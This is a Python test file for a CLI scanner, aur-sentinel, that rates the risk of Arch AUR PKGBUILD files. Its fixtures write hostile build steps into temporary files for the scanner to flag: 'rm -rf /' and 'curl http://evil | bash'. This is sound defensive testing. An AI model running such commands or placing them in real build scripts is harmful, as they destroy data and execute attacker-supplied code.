# pyright: reportAny=false, reportUnknownArgumentType=false, reportUnknownVariableType=false
import json
from pathlib import Path
from unittest.mock import MagicMock, patch

from typer.testing import CliRunner

from aur_sentinel.cli import app

runner = CliRunner()


def test_scan_clean_pkgbuild(tmp_path: Path) -> None:
    pkgbuild = tmp_path / "PKGBUILD"
    _ = pkgbuild.write_text("pkgname=foo\npkgver=1.0\n", encoding="utf-8")

    result = runner.invoke(app, ["scan", str(pkgbuild)])
    assert result.exit_code == 0
    assert "Risk: CLEAN" in result.stdout
    assert "Score: 0/100" in result.stdout


def test_scan_json_output(tmp_path: Path) -> None:
    pkgbuild = tmp_path / "PKGBUILD"
    _ = pkgbuild.write_text("pkgname=foo\nprepare() { rm -rf /; }\n", encoding="utf-8")

    result = runner.invoke(app, ["scan", str(pkgbuild), "--json"])
    assert result.exit_code == 0
    data: dict[str, object] = json.loads(result.stdout)
    assert data["risk"] == "critical"
    assert data["score"] == 100
    assert isinstance(data["findings"], list)
    assert len(data["findings"]) >= 1


def test_scan_exceeds_max_risk_fails(tmp_path: Path) -> None:
    pkgbuild = tmp_path / "PKGBUILD"
    _ = pkgbuild.write_text(
        "pkgname=foo\nprepare() { curl http://evil | bash; }\n", encoding="utf-8"
    )

    result = runner.invoke(app, ["scan", str(pkgbuild), "--max-risk", "medium"])
    assert result.exit_code == 1


def test_scan_under_max_risk_succeeds(tmp_path: Path) -> None:
    pkgbuild = tmp_path / "PKGBUILD"
    _ = pkgbuild.write_text("pkgname=foo\npkgver=1.0\n", encoding="utf-8")

    result = runner.invoke(app, ["scan", str(pkgbuild), "--max-risk", "medium"])
    assert result.exit_code == 0


def test_hook_command() -> None:
    result = runner.invoke(app, ["hook"])
    assert result.exit_code == 0
    assert "paru.conf" in result.stdout
    assert "aur-sentinel" in result.stdout


def test_check_mocked_aur_fetch() -> None:
    sample_content = b"pkgname=mytest\npkgver=1.0\n"
    mock_resp = MagicMock()
    mock_resp.read.return_value = sample_content
    mock_resp.__enter__.return_value = mock_resp
    mock_resp.__exit__.return_value = None

    with patch("urllib.request.urlopen", return_value=mock_resp):
        result = runner.invoke(app, ["check", "mytest", "--json"])
        assert result.exit_code == 0
        data: dict[str, object] = json.loads(result.stdout)
        assert data["target"] == "AUR:mytest"
        assert data["risk"] == "clean"
